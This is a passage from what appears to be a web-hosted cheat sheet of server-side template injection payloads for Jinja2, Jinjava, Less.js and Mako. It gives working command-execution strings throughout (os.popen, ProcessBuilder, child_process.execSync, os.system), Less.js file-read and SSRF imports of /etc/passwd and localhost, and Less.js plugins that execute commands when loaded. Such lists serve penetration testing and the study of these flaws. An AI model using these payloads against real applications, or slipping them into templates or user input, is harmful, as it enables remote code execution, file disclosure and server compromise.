<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;application&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">globals</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">getitem</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">builtins</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">getitem</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">import</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;popen&#39;</span>)(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;read&#39;</span>)()}}
</span></span></code></pre></div><hr>
<h2 id="jinjava">
  Jinjava
  <a class="anchor" href="#jinjava">#</a>
</h2>
<p><a href="https://github.com/HubSpot/jinjava">Official website</a></p>
<blockquote>
<p>Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).</p>
</blockquote>
<h3 id="jinjava---basic-injection">
  Jinjava - Basic injection
  <a class="anchor" href="#jinjava---basic-injection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>toUpperCase()}} would result <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>{{ request }} would <span style="color:#66d9ef">return</span> a request object like com<span style="color:#f92672">.</span>[<span style="color:#f92672">...</span>]<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>TemplateContextRequest<span style="color:#f92672">@</span><span style="color:#ae81ff">23548206</span>
</span></span></code></pre></div><p>Jinjava is an open source project developed by Hubspot, available at <a href="https://github.com/HubSpot/jinjava/">https://github.com/HubSpot/jinjava/</a></p>
<h3 id="jinjava---command-execution">
  Jinjava - Command execution
  <a class="anchor" href="#jinjava---command-execution">#</a>
</h3>
<p>Fixed by <a href="https://github.com/HubSpot/jinjava/pull/230">https://github.com/HubSpot/jinjava/pull/230</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;new java.lang.String(&#39;xxx&#39;)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder; x.command(</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">whoami</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">); x.start()</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder; x.command(</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">netstat</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder; x.command(</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">uname</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">-a</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
</span></span></code></pre></div><hr>
<h2 id="lessjs">
  Lessjs
  <a class="anchor" href="#lessjs">#</a>
</h2>
<p><a href="https://lesscss.org/">Official website</a></p>
<blockquote>
<p>Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.</p>
</blockquote>
<h3 id="lessjs---ssrf--lfi">
  Lessjs - SSRF / LFI
  <a class="anchor" href="#lessjs---ssrf--lfi">#</a>
</h3>
<pre tabindex="0"><code class="language-less" data-lang="less">@import (inline) &#34;http://localhost&#34;;
// or
@import (inline) &#34;/etc/passwd&#34;;
</code></pre><h3 id="lessjs--v3---command-execution">
  Lessjs &lt; v3 - Command Execution
  <a class="anchor" href="#lessjs--v3---command-execution">#</a>
</h3>
<pre tabindex="0"><code class="language-less" data-lang="less">body {
  color: `global.process.mainModule.require(&#34;child_process&#34;).execSync(&#34;id&#34;)`;
}
</code></pre><h3 id="plugins">
  Plugins
  <a class="anchor" href="#plugins">#</a>
</h3>
<p>Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.</p>
<pre tabindex="0"><code class="language-less" data-lang="less">// example local plugin usage
@plugin &#34;plugin-2.7.js&#34;;
</code></pre><p>or</p>
<pre tabindex="0"><code class="language-less" data-lang="less">// example remote plugin usage
@plugin &#34;http://example.com/plugin-2.7.js&#34;
</code></pre><p>version 2 example RCE plugin:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">functions</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">`&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#a6e22e">val</span>.<span style="color:#a6e22e">value</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;`</span>;
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>version 3 and above example RCE plugin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">//Vulnerable plugin (3.13.1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">registerPlugin</span>({
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">install</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">less</span>, <span style="color:#a6e22e">pluginManager</span>, <span style="color:#a6e22e">functions</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">functions</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#a6e22e">val</span>.<span style="color:#a6e22e">value</span>).<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><hr>
<h2 id="mako">
  Mako
  <a class="anchor" href="#mako">#</a>
</h2>
<p><a href="https://www.makotemplates.org/">Official website</a></p>
<blockquote>
<p>Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>x<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span><span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{x}
</span></span></code></pre></div><h3 id="direct-access-to-os-from-templatenamespace">
  Direct access to os from TemplateNamespace:
  <a class="anchor" href="#direct-access-to-os-from-templatenamespace">#</a>
</h3>
<p>Any of these payloads allows direct access to the <code>os</code> module</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;util&#39;</span>]<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;id&#39;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;id&#39;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>traceback<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
